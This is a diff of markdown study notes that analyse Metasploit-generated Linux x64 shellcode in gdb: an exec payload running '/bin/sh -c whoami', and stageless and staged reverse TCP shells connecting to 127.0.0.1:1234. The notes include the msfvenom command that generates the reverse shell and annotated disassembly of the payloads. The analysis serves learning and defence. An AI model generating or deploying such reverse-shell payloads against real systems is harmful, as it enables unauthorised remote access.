@@ -18,6 +18,7 @@ the journey starts with a:
 i can now run vmmap, grep, and x/ to analyze the program   
 vmmap for example show that 0x400000 is rwx  
 and x/20i 0x400078 (where 0x400078 is starting point) shows us what looks like the main letting us to analyze without actually running it:
+
     gef➤  x/20i 0x400078
     ; this could be the syscall id, 0x3b is sys_execve
     => 0x400078:    push   0x3b
@@ -52,6 +53,7 @@ and x/20i 0x400078 (where 0x400078 is starting point) shows us what looks like t
 
 
 let's explore 0x40009f:
+
     gef➤  x/20i 0x40009f
     ; the call moves RIP here. we see that something from rsi is pushed, rsi
     ; was -c. also rdi is pushed, and we know that rdi was a pointer to
@@ -67,12 +69,14 @@ let's explore 0x40009f:
     0x4000a4:    syscall
 
 here is the stack when RIP is at 0x40009f:
+
 > 0x00007fffffffe420│+0x0000: 0x0000000000400098  →  0x5600696d616f6877 ("whoami"?)        ← $rsp
 > 0x00007fffffffe428│+0x0008: 0x0000000000000000
 > 0x00007fffffffe430│+0x0010: 0x000000000000632d ("-c"?)   ← $rsi
 > 0x00007fffffffe438│+0x0018: 0x0068732f6e69622f ("/bin/sh"?)      ← $rdi
 
 and at 0x4000a1 (mov rsi,rsp):
+
 > 0x00007fffffffe410│+0x0000: 0x00007fffffffe438  →  0x0068732f6e69622f ("/bin/sh"?)       ← $rsp
 > 0x00007fffffffe418│+0x0008: 0x00007fffffffe430  →  0x000000000000632d ("-c"?)
 > 0x00007fffffffe420│+0x0010: 0x0000000000400098  →  0x5600696d616f6877 ("whoami"?)
@@ -84,10 +88,12 @@ reverse stageless
 =================
 payload generated with: msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=1234 -f elf > 05-reversetcp_stageless  
 journey starts with a:
+
     gdb ./05-reversetcp_stageless
     starti
 
 reading the first 8 instructions, i see that the sys_socket syscall is created with an AF_INET STREAM (tcp).
+
     →   0x400078                  push   0x29
         0x40007a                  pop    rax
         0x40007b                  cdq
@@ -126,6 +132,7 @@ should be safe to run until 0x400082, so i just b *0x400082 and c
 
 let's b *0x40009a to easily jump over already analyzed code and c  
 following syscall is quite small, analyze line by line:
+
     ; put 3 in rsi and decrement: like push 0x2
     0x40009c                  push   0x3
     0x40009e                  pop    rsi
@@ -138,6 +145,7 @@ following syscall is quite small, analyze line by line:
     0x4000a7                  jne    0x40009f
 
 after that, we will x/20i 0x4000a9 to see following 20 instructions, that i'll analyze line by line:
+
     ; 0x3b is our beloved sys_execve, when she's in rax we know something
     ; good (or bad) will happen
     0x4000a9:    push   0x3b
@@ -165,6 +173,7 @@ i expect this payload to be more interesting to analyze because of the stager. l
     starti
 
 analyze the first 20 instruction, to see what will happen:
+
     gef➤  x/20i 0x400078
     => 0x400078:    xor    rdi,rdi
     ; 0x9 syscall refers to sys_mmap, let's man it:
@@ -190,6 +199,7 @@ analyze the first 20 instruction, to see what will happen:
     0x40008d:    syscall
 
 after the syscall, i will x/20i 0x40008d:
+
     ; if everythings ok, go on
     0x40008f:    test   rax,rax
     0x400092:    js     0x4000e5
@@ -208,6 +218,7 @@ after the syscall, i will x/20i 0x40008d:
     0x4000a3:    syscall
 
 let's x/20i 0x4000a5 to read the code after syscall:
+
     ; at 0x4000bd we see that the syscall will be sys_connect. struct is
     ; defined at 0x4000ac and points to 127.0.0.1:1234 as discussed for the
     ; stageless one
@@ -246,6 +257,7 @@ let's x/20i 0x4000a5 to read the code after syscall:
 
 looks harmless again, because just waits for something and doesn't "elaborate". yet.
 b *0x4000dd after the syscall and x/20i 0x4000dd:
+
     ; this code basically exit if there is an error, from 0x4000e5 is also used as
     ; neat exit before
     0x4000dd:    pop    rcx
